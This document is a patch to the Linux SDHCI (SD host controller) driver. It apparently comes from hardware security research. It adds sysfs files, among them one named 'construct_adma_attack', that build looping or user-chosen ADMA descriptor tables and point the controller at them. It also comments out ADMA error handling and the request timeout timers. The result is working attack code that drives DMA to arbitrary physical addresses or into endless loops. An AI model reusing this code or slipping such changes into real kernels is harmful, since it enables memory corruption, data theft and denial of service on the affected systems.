@@ -1,0 +1,616 @@
+--- sdhci_o.c	2025-01-15 10:06:58.302493000 +0100
++++ sdhci.c	2025-01-27 16:38:51.766078160 +0100
+@@ -23,7 +23,7 @@
+ #include <linux/regulator/consumer.h>
+ #include <linux/pm_runtime.h>
+ #include <linux/of.h>
+-
++#include <linux/time.h>
+ #include <linux/leds.h>
+ 
+ #include <linux/mmc/mmc.h>
+@@ -32,7 +32,7 @@
+ #include <linux/mmc/sdio.h>
+ #include <linux/mmc/slot-gpio.h>
+ 
+-#include "sdhci.h"
++#include "../drivers/mmc/host/sdhci.h"
+ 
+ #define DRIVER_NAME "sdhci"
+ 
+@@ -531,6 +531,7 @@
+ 
+ static void sdhci_read_block_pio(struct sdhci_host *host)
+ {
++	unsigned long flags;
+ 	size_t blksize, len, chunk;
+ 	u32 scratch;
+ 	u8 *buf;
+@@ -540,6 +541,8 @@
+ 	blksize = host->data->blksz;
+ 	chunk = 0;
+ 
++	local_irq_save(flags);
++
+ 	while (blksize) {
+ 		BUG_ON(!sg_miter_next(&host->sg_miter));
+ 
+@@ -566,10 +569,13 @@
+ 	}
+ 
+ 	sg_miter_stop(&host->sg_miter);
++
++	local_irq_restore(flags);
+ }
+ 
+ static void sdhci_write_block_pio(struct sdhci_host *host)
+ {
++	unsigned long flags;
+ 	size_t blksize, len, chunk;
+ 	u32 scratch;
+ 	u8 *buf;
+@@ -580,6 +586,8 @@
+ 	chunk = 0;
+ 	scratch = 0;
+ 
++	local_irq_save(flags);
++
+ 	while (blksize) {
+ 		BUG_ON(!sg_miter_next(&host->sg_miter));
+ 
+@@ -606,6 +614,8 @@
+ 	}
+ 
+ 	sg_miter_stop(&host->sg_miter);
++
++	local_irq_restore(flags);
+ }
+ 
+ static void sdhci_transfer_pio(struct sdhci_host *host)
+@@ -701,14 +711,16 @@
+ 	return sg_count;
+ }
+ 
+-static char *sdhci_kmap_atomic(struct scatterlist *sg)
++static char *sdhci_kmap_atomic(struct scatterlist *sg, unsigned long *flags)
+ {
+-	return kmap_local_page(sg_page(sg)) + sg->offset;
++	local_irq_save(*flags);
++	return kmap_atomic(sg_page(sg)) + sg->offset;
+ }
+ 
+-static void sdhci_kunmap_atomic(void *buffer)
++static void sdhci_kunmap_atomic(void *buffer, unsigned long *flags)
+ {
+-	kunmap_local(buffer);
++	kunmap_atomic(buffer);
++	local_irq_restore(*flags);
+ }
+ 
+ void sdhci_adma_write_desc(struct sdhci_host *host, void **desc,
+@@ -745,11 +757,13 @@
+ 	/* 32-bit and 64-bit descriptors have 'cmd' in same position */
+ 	dma_desc->cmd |= cpu_to_le16(ADMA2_END);
+ }
+-
++static dma_addr_t adma_addr = 0;
++static bool custom_adma = false;
+ static void sdhci_adma_table_pre(struct sdhci_host *host,
+ 	struct mmc_data *data, int sg_count)
+ {
+ 	struct scatterlist *sg;
++	unsigned long flags;
+ 	dma_addr_t addr, align_addr;
+ 	void *desc, *align;
+ 	char *buffer;
+@@ -781,9 +795,9 @@
+ 			 SDHCI_ADMA2_MASK;
+ 		if (offset) {
+ 			if (data->flags & MMC_DATA_WRITE) {
+-				buffer = sdhci_kmap_atomic(sg);
++				buffer = sdhci_kmap_atomic(sg, &flags);
+ 				memcpy(align, buffer, offset);
+-				sdhci_kunmap_atomic(buffer);
++				sdhci_kunmap_atomic(buffer, &flags);
+ 			}
+ 
+ 			/* tran, valid */
+@@ -815,9 +829,7 @@
+ 
+ 		/* tran, valid */
+ 		if (len)
+-			__sdhci_adma_write_desc(host, &desc, addr, len,
+-						ADMA2_TRAN_VALID);
+-
++			__sdhci_adma_write_desc(host, &desc, addr, len, ADMA2_TRAN_VALID);
+ 		/*
+ 		 * If this triggers then we have a calculation bug
+ 		 * somewhere. :/
+@@ -844,6 +856,7 @@
+ 	int i, size;
+ 	void *align;
+ 	char *buffer;
++	unsigned long flags;
+ 
+ 	if (data->flags & MMC_DATA_READ) {
+ 		bool has_unaligned = false;
+@@ -866,9 +879,9 @@
+ 					size = SDHCI_ADMA2_ALIGN -
+ 					       (sg_dma_address(sg) & SDHCI_ADMA2_MASK);
+ 
+-					buffer = sdhci_kmap_atomic(sg);
++					buffer = sdhci_kmap_atomic(sg, &flags);
+ 					memcpy(buffer, align, size);
+-					sdhci_kunmap_atomic(buffer);
++					sdhci_kunmap_atomic(buffer, &flags);
+ 
+ 					align += SDHCI_ADMA2_ALIGN;
+ 				}
+@@ -1110,6 +1123,8 @@
+ 		sdhci_writew(host, data->blocks, SDHCI_BLOCK_COUNT);
+ 	}
+ }
++static ktime_t t0,t1 = 0;
++static int loop_cnt = 0 ;
+ 
+ static void sdhci_prepare_data(struct sdhci_host *host, struct mmc_command *cmd)
+ {
+@@ -1181,7 +1196,15 @@
+ 			host->flags &= ~SDHCI_REQ_USE_DMA;
+ 		} else if (host->flags & SDHCI_USE_ADMA) {
+ 			sdhci_adma_table_pre(host, data, sg_cnt);
+-			sdhci_set_adma_addr(host, host->adma_addr);
++			if(adma_addr !=0 && custom_adma)
++			{
++				pr_warn("=== Sending command to SDHC for customed DMA operations. ===\n");
++				loop_cnt=0;
++				t0 = ktime_get();
++				sdhci_set_adma_addr(host, adma_addr);
++			}
++			else
++				sdhci_set_adma_addr(host, host->adma_addr);
+ 		} else {
+ 			WARN_ON(sg_cnt != 1);
+ 			sdhci_set_sdma_addr(host, sdhci_sdma_address(host));
+@@ -1457,7 +1480,7 @@
+ 		if (host->quirks2 &
+ 			SDHCI_QUIRK2_CLEAR_TRANSFERMODE_REG_BEFORE_CMD) {
+ 			/* must not clear SDHCI_TRANSFER_MODE when tuning */
+-			if (!mmc_op_tuning(cmd->opcode))
++			if (cmd->opcode != MMC_SEND_TUNING_BLOCK_HS200)
+ 				sdhci_writew(host, 0x0, SDHCI_TRANSFER_MODE);
+ 		} else {
+ 		/* clear Auto CMD settings for no data CMDs */
+@@ -1698,7 +1721,8 @@
+ 		flags |= SDHCI_CMD_INDEX;
+ 
+ 	/* CMD19 is special in that the Data Present Select should be set */
+-	if (cmd->data || mmc_op_tuning(cmd->opcode))
++	if (cmd->data || cmd->opcode == MMC_SEND_TUNING_BLOCK ||
++	    cmd->opcode == MMC_SEND_TUNING_BLOCK_HS200)
+ 		flags |= SDHCI_CMD_DATA;
+ 
+ 	timeout = jiffies;
+@@ -2294,7 +2318,7 @@
+ 	case MMC_TIMING_UHS_DDR50:
+ 	case MMC_TIMING_MMC_DDR52:
+ 		return true;
+-	}
++	};
+ 	return false;
+ }
+ 
+@@ -2408,21 +2432,8 @@
+ 	if (host->version >= SDHCI_SPEC_300) {
+ 		u16 clk, ctrl_2;
+ 
+-		/*
+-		 * According to SDHCI Spec v3.00, if the Preset Value
+-		 * Enable in the Host Control 2 register is set, we
+-		 * need to reset SD Clock Enable before changing High
+-		 * Speed Enable to avoid generating clock glitches.
+-		 */
+-		clk = sdhci_readw(host, SDHCI_CLOCK_CONTROL);
+-		if (clk & SDHCI_CLOCK_CARD_EN) {
+-			clk &= ~SDHCI_CLOCK_CARD_EN;
+-			sdhci_writew(host, clk, SDHCI_CLOCK_CONTROL);
+-		}
+-
+-		sdhci_writeb(host, ctrl, SDHCI_HOST_CONTROL);
+-
+ 		if (!host->preset_enabled) {
++			sdhci_writeb(host, ctrl, SDHCI_HOST_CONTROL);
+ 			/*
+ 			 * We only need to set Driver Strength if the
+ 			 * preset value enable is not set.
+@@ -2445,8 +2456,30 @@
+ 
+ 			sdhci_writew(host, ctrl_2, SDHCI_HOST_CONTROL2);
+ 			host->drv_type = ios->drv_type;
++		} else {
++			/*
++			 * According to SDHC Spec v3.00, if the Preset Value
++			 * Enable in the Host Control 2 register is set, we
++			 * need to reset SD Clock Enable before changing High
++			 * Speed Enable to avoid generating clock gliches.
++			 */
++
++			/* Reset SD Clock Enable */
++			clk = sdhci_readw(host, SDHCI_CLOCK_CONTROL);
++			clk &= ~SDHCI_CLOCK_CARD_EN;
++			sdhci_writew(host, clk, SDHCI_CLOCK_CONTROL);
++
++			sdhci_writeb(host, ctrl, SDHCI_HOST_CONTROL);
++
++			/* Re-enable SD Clock */
++			host->ops->set_clock(host, host->clock);
+ 		}
+ 
++		/* Reset SD Clock Enable */
++		clk = sdhci_readw(host, SDHCI_CLOCK_CONTROL);
++		clk &= ~SDHCI_CLOCK_CARD_EN;
++		sdhci_writew(host, clk, SDHCI_CLOCK_CONTROL);
++
+ 		host->ops->set_uhs_signaling(host, ios->timing);
+ 		host->timing = ios->timing;
+ 
+@@ -2515,29 +2548,26 @@
+ 
+ static int sdhci_check_ro(struct sdhci_host *host)
+ {
+-	bool allow_invert = false;
++	unsigned long flags;
+ 	int is_readonly;
+ 
+-	if (host->flags & SDHCI_DEVICE_DEAD) {
++	spin_lock_irqsave(&host->lock, flags);
++
++	if (host->flags & SDHCI_DEVICE_DEAD)
+ 		is_readonly = 0;
+-	} else if (host->ops->get_ro) {
++	else if (host->ops->get_ro)
+ 		is_readonly = host->ops->get_ro(host);
+-	} else if (mmc_can_gpio_ro(host->mmc)) {
++	else if (mmc_can_gpio_ro(host->mmc))
+ 		is_readonly = mmc_gpio_get_ro(host->mmc);
+-		/* Do not invert twice */
+-		allow_invert = !(host->mmc->caps2 & MMC_CAP2_RO_ACTIVE_HIGH);
+-	} else {
++	else
+ 		is_readonly = !(sdhci_readl(host, SDHCI_PRESENT_STATE)
+ 				& SDHCI_WRITE_PROTECT);
+-		allow_invert = true;
+-	}
+ 
+-	if (is_readonly >= 0 &&
+-	    allow_invert &&
+-	    (host->quirks & SDHCI_QUIRK_INVERTED_WRITE_PROTECT))
+-		is_readonly = !is_readonly;
++	spin_unlock_irqrestore(&host->lock, flags);
+ 
+-	return is_readonly;
++	/* This quirk needs to be replaced by a callback-function later */
++	return host->quirks & SDHCI_QUIRK_INVERTED_WRITE_PROTECT ?
++		!is_readonly : is_readonly;
+ }
+ 
+ #define SAMPLE_COUNT	5
+@@ -3372,6 +3402,8 @@
+ 
+ static void sdhci_data_irq(struct sdhci_host *host, u32 intmask)
+ {
++	u32 command;
++
+ 	/*
+ 	 * CMD19 generates _only_ Buffer Read Ready interrupt if
+ 	 * use sdhci_send_tuning.
+@@ -3380,7 +3412,9 @@
+ 	 * SDHCI_INT_DATA_AVAIL always there, stuck in irq storm.
+ 	 */
+ 	if (intmask & SDHCI_INT_DATA_AVAIL && !host->data) {
+-		if (mmc_op_tuning(SDHCI_GET_CMD(sdhci_readw(host, SDHCI_COMMAND)))) {
++		command = SDHCI_GET_CMD(sdhci_readw(host, SDHCI_COMMAND));
++		if (command == MMC_SEND_TUNING_BLOCK ||
++		    command == MMC_SEND_TUNING_BLOCK_HS200) {
+ 			host->tuning_done = 1;
+ 			wake_up(&host->buf_ready_int);
+ 			return;
+@@ -3441,19 +3475,13 @@
+ 		host->data->error = -EILSEQ;
+ 		if (!mmc_op_tuning(SDHCI_GET_CMD(sdhci_readw(host, SDHCI_COMMAND))))
+ 			sdhci_err_stats_inc(host, DAT_CRC);
+-	} else if ((intmask & (SDHCI_INT_DATA_CRC | SDHCI_INT_TUNING_ERROR)) &&
++	} else if ((intmask & SDHCI_INT_DATA_CRC) &&
+ 		SDHCI_GET_CMD(sdhci_readw(host, SDHCI_COMMAND))
+ 			!= MMC_BUS_TEST_R) {
+ 		host->data->error = -EILSEQ;
+ 		if (!mmc_op_tuning(SDHCI_GET_CMD(sdhci_readw(host, SDHCI_COMMAND))))
+ 			sdhci_err_stats_inc(host, DAT_CRC);
+-		if (intmask & SDHCI_INT_TUNING_ERROR) {
+-			u16 ctrl2 = sdhci_readw(host, SDHCI_HOST_CONTROL2);
+-
+-			ctrl2 &= ~SDHCI_CTRL_TUNED_CLK;
+-			sdhci_writew(host, ctrl2, SDHCI_HOST_CONTROL2);
+-		}
+-	} else if (intmask & SDHCI_INT_ADMA_ERROR) {
++	} /*else if (intmask & SDHCI_INT_ADMA_ERROR) {
+ 		pr_err("%s: ADMA error: 0x%08x\n", mmc_hostname(host->mmc),
+ 		       intmask);
+ 		sdhci_adma_show_error(host);
+@@ -3461,7 +3489,7 @@
+ 		host->data->error = -EIO;
+ 		if (host->ops->adma_workaround)
+ 			host->ops->adma_workaround(host, intmask);
+-	}
++	}*/
+ 
+ 	if (host->data->error)
+ 		sdhci_finish_data(host);
+@@ -3520,6 +3548,10 @@
+ 		data->host_cookie == COOKIE_MAPPED);
+ }
+ 
++static struct sdhci_adma2_32_desc * desc_table;
++static int desc_table_sz;
++
++
+ static irqreturn_t sdhci_irq(int irq, void *dev_id)
+ {
+ 	struct mmc_request *mrqs_done[SDHCI_MAX_MRQS] = {0};
+@@ -3528,15 +3560,26 @@
+ 	u32 intmask, mask, unexpected = 0;
+ 	int max_loops = 16;
+ 	int i;
+-
++	
+ 	spin_lock(&host->lock);
+ 
+ 	if (host->runtime_suspended) {
+ 		spin_unlock(&host->lock);
+ 		return IRQ_NONE;
+ 	}
+-
++	
+ 	intmask = sdhci_readl(host, SDHCI_INT_STATUS);
++	if(intmask & SDHCI_INT_DMA_END) /* APPENDED */
++	{
++		loop_cnt++;
++		t1 = ktime_get();
++		if(loop_cnt%100==0)
++			dev_info(mmc_dev(host->mmc), "DMA operation is still on going...\nDelayed introduced since command execution: %ld ms \n",(unsigned long)ktime_to_ms(ktime_sub(t1, t0)));
++		//intmask &=  ~SDHCI_INT_DMA_END;
++		sdhci_writel(host,0, SDHCI_INT_STATUS);		
++
++	}
++	
+ 	if (!intmask || intmask == 0xffffffff) {
+ 		result = IRQ_NONE;
+ 		goto out;
+@@ -3987,7 +4030,7 @@
+ 	} else
+ 		*cmd_error = 0;
+ 
+-	if (intmask & (SDHCI_INT_DATA_END_BIT | SDHCI_INT_DATA_CRC | SDHCI_INT_TUNING_ERROR)) {
++	if (intmask & (SDHCI_INT_DATA_END_BIT | SDHCI_INT_DATA_CRC)) {
+ 		*data_error = -EILSEQ;
+ 		if (!mmc_op_tuning(SDHCI_GET_CMD(sdhci_readw(host, SDHCI_COMMAND))))
+ 			sdhci_err_stats_inc(host, DAT_CRC);
+@@ -4130,6 +4173,9 @@
+ 	v = ver ? *ver : sdhci_readw(host, SDHCI_HOST_VERSION);
+ 	host->version = (v & SDHCI_SPEC_VER_MASK) >> SDHCI_SPEC_VER_SHIFT;
+ 
++	/*if (host->quirks & SDHCI_QUIRK_MISSING_CAPS)
++		return;*/
++
+ 	if (caps) {
+ 		host->caps = *caps;
+ 	} else {
+@@ -4797,11 +4843,183 @@
+ }
+ EXPORT_SYMBOL_GPL(sdhci_cleanup_host);
+ 
++static ssize_t enable_custom_adma(struct device *dev, struct device_attribute *attr, char *output)
++{
++	custom_adma = true;
++	return 0;
++}
++static ssize_t construct_adma_attack(struct device *dev, struct device_attribute *attr, char *output)
++{
++	if(!desc_table)
++	{
++		dev_info(dev,"Warning: Descriptor table must be allocated before \n");
++		return 0;
++	}
++
++	struct sdhci_host *host = dev_get_drvdata(dev);
++	void *desc = (void*)desc_table;
++
++	sdhci_adma_write_desc(host, &desc , adma_addr, SDHCI_ADMA2_32_DESC_SZ, 0x21); //Ovewrite the current descirpor with 8 bytes from the SD card
++	for(int i=SDHCI_ADMA2_32_DESC_SZ+SDHCI_ADMA2_32_DESC_SZ; i <= (desc_table_sz-SDHCI_ADMA2_32_DESC_SZ) ; i+=SDHCI_ADMA2_32_DESC_SZ) //Fills the table with linked-desciptors
++	{
++		sdhci_adma_write_desc(host, &desc, adma_addr+i, 0, 0x31);
++	}
++	sdhci_adma_write_desc(host, &desc, adma_addr, 0, 0x31);//The last descriptor is a linked descriptor that points to the begining of the descriptor table
++
++	dev_info(dev,"Size of the descriptor table in RAM: %lu bytes \n",(unsigned long)desc_table_sz);
++	return 0;
++}
++
++
++static ssize_t fill_link_desc(struct device *dev, struct device_attribute *attr, const char *buf, size_t count)
++{
++	if(!desc_table)
++	{
++		dev_info(dev,"Warning: Descriptor table must be allocated before \n");
++		return count;
++	}
++	struct sdhci_host *host = dev_get_drvdata(dev);
++	void *desc = (void*)desc_table;
++
++	for(int i=SDHCI_ADMA2_32_DESC_SZ; i <= (desc_table_sz-SDHCI_ADMA2_32_DESC_SZ) ; i+=SDHCI_ADMA2_32_DESC_SZ)
++	{
++		sdhci_adma_write_desc(host, &desc, adma_addr+i, 0, 0x31);
++		//desc+=SDHCI_ADMA2_32_DESC_SZ;
++	}
++
++	dma_addr_t dma_addr = *(dma_addr_t *)buf;
++	int length = *(u16 *)(buf+sizeof(u32));
++	int flags = *(u16 *)(buf+sizeof(u32)+sizeof(u16));
++	desc = (void*)desc_table+desc_table_sz-SDHCI_ADMA2_32_DESC_SZ;
++
++	sdhci_adma_write_desc(host, &desc , dma_addr, length, flags);
++
++	return count;
++
++}
++
++
++static ssize_t insert_desc(struct device *dev, struct device_attribute *attr, const char *buf, size_t count)
++{
++	struct sdhci_host *host = dev_get_drvdata(dev);
++	
++	if(!desc_table)
++	{
++		dev_info(dev,"Warning: Descriptor table must be allocated before \n");
++		return count;
++	}
++	int position = *(u16 *)(buf+SDHCI_ADMA2_32_DESC_SZ);
++	dev_info(dev,"INFO: Position of the descriptor to be inserted %d \n",position);
++
++	if((position*SDHCI_ADMA2_32_DESC_SZ) >= (desc_table_sz-SDHCI_ADMA2_32_DESC_SZ))
++	{
++		dev_info(dev,"Warning: position out of the descriptor table \n");
++		return count;
++	}
++
++	dma_addr_t dma_addr = *(dma_addr_t *)buf;
++	int length = *(u16 *)(buf+sizeof(u32));
++	int flags = *(u16 *)(buf+sizeof(u32)+sizeof(u16));
++	void *desc = (void*)desc_table+(position*SDHCI_ADMA2_32_DESC_SZ);
++
++	sdhci_adma_write_desc(host, &desc , dma_addr, length, flags);
++
++	return count;
++}
++
++static ssize_t request_desc_table(struct device *dev, struct device_attribute *attr, const char *buf, size_t count)
++{
++	int nbPages=0;
++	sscanf(buf, "%d", &nbPages);
++
++	dev_info(dev, "%d pages in RAM requested for ADMA descriptor table \n",nbPages);
++	desc_table_sz = PAGE_SIZE*nbPages;
++
++	desc_table = dma_alloc_coherent(dev,desc_table_sz, &adma_addr, GFP_KERNEL);
++
++	dev_info(dev, "Descriptor table allocated at address: %08llx \n",adma_addr);
++
++	return count;
++
++}
++
++static ssize_t fill_cstm_desc(struct device *dev, struct device_attribute *attr, const char *buf, size_t count)
++{
++	if(!desc_table)
++	{
++		dev_info(dev,"Warning: Descriptor table must be allocated before \n");
++		return count;
++	}
++	struct sdhci_host *host = dev_get_drvdata(dev);
++
++	dma_addr_t dma_addr = *(dma_addr_t *)buf;
++	int length = *(u16 *)(buf+sizeof(u32));
++	int flags = *(u16 *)(buf+sizeof(u32)+sizeof(u16));
++
++	void *desc = (void*) desc_table;
++	for(int i=0; i <= desc_table_sz-SDHCI_ADMA2_32_DESC_SZ; i+=SDHCI_ADMA2_32_DESC_SZ)
++	{
++		sdhci_adma_write_desc(host, &desc, dma_addr, length, flags);
++	}
++	return count;
++
++}
++static ssize_t adma_reset(struct device *dev, struct device_attribute *attr, char *output)
++{
++	custom_adma = false;
++	adma_addr = 0;
++	struct sdhci_host *host = dev_get_drvdata(dev);
++	sdhci_reset_for_all(host);
++	return 0;
++}
++
++static ssize_t set_adma_addr(struct device *dev, struct device_attribute *attr, const char *buf, size_t count)
++{
++	struct sdhci_host *host = dev_get_drvdata(dev);
++	adma_addr = *(dma_addr_t *)buf;
++	dev_info(dev, "Setting ADMA Addr to: %08llx \n",adma_addr);
++	sdhci_set_adma_addr(host, adma_addr);
++	return count;
++
++}
++
++static ssize_t sdhc_get_info(struct device *dev, struct device_attribute *attr, char *output)
++{
++	struct sdhci_host *host = dev_get_drvdata(dev);
++	dev_info(dev, "ADMA descr. max size host supports: %d \n",host->alloc_desc_sz);
++	dev_info(dev, "ADMA current descriptor size: %d \n",host->desc_sz);
++	dev_info(dev, "Current clock (MHz): %d \n",host->clock);
++	dev_info(dev, "Clock Muliplier value: %d \n",host->clk_mul);
++	dev_info(dev, "Max possible freq (MHz): %d \n",host->max_clk);
++
++	return 0;
++}
++
++
++static DEVICE_ATTR(construct_adma_attack, S_IRUGO,construct_adma_attack,NULL);
++static DEVICE_ATTR(enable_custom_adma, S_IRUGO, enable_custom_adma,NULL);
++static DEVICE_ATTR(insert_desc, S_IWUSR, NULL, insert_desc);
++static DEVICE_ATTR(request_desc_table, S_IWUSR, NULL, request_desc_table);
++static DEVICE_ATTR(fill_link_desc, S_IWUSR, NULL, fill_link_desc);
++static DEVICE_ATTR(fill_cstm_desc, S_IWUSR, NULL, fill_cstm_desc);
++static DEVICE_ATTR(set_adma_addr, S_IWUSR, NULL, set_adma_addr);
++static DEVICE_ATTR(adma_reset, S_IRUGO, adma_reset,NULL);
++static DEVICE_ATTR(sdhc_get_info, S_IRUGO, sdhc_get_info,NULL);
++
+ int __sdhci_add_host(struct sdhci_host *host)
+ {
+ 	unsigned int flags = WQ_UNBOUND | WQ_MEM_RECLAIM | WQ_HIGHPRI;
+ 	struct mmc_host *mmc = host->mmc;
+ 	int ret;
++	device_create_file(mmc->parent, &dev_attr_construct_adma_attack);
++	device_create_file(mmc->parent, &dev_attr_enable_custom_adma);
++	device_create_file(mmc->parent, &dev_attr_adma_reset);
++	device_create_file(mmc->parent, &dev_attr_sdhc_get_info);
++	device_create_file(mmc->parent, &dev_attr_set_adma_addr);
++	device_create_file(mmc->parent, &dev_attr_fill_cstm_desc);
++	device_create_file(mmc->parent, &dev_attr_fill_link_desc);
++	device_create_file(mmc->parent, &dev_attr_request_desc_table);
++	device_create_file(mmc->parent, &dev_attr_insert_desc);
+ 
+ 	if ((mmc->caps2 & MMC_CAP2_CQE) &&
+ 	    (host->quirks & SDHCI_QUIRK_BROKEN_CQE)) {
+@@ -4815,8 +5033,8 @@
+ 
+ 	INIT_WORK(&host->complete_work, sdhci_complete_work);
+ 
+-	timer_setup(&host->timer, sdhci_timeout_timer, 0);
+-	timer_setup(&host->data_timer, sdhci_timeout_data_timer, 0);
++	//timer_setup(&host->timer, sdhci_timeout_timer, 0);
++	//timer_setup(&host->data_timer, sdhci_timeout_data_timer, 0);
+ 
+ 	init_waitqueue_head(&host->buf_ready_int);
+ 
+@@ -4959,7 +5177,7 @@
+ 	pr_info(DRIVER_NAME
+ 		": Secure Digital Host Controller Interface driver\n");
+ 	pr_info(DRIVER_NAME ": Copyright(c) Pierre Ossman\n");
+-
++	
+ 	return 0;
+ }
+ 
+@@ -4979,3 +5197,4 @@
+ 
+ MODULE_PARM_DESC(debug_quirks, "Force certain quirks.");
+ MODULE_PARM_DESC(debug_quirks2, "Force certain other quirks.");
++
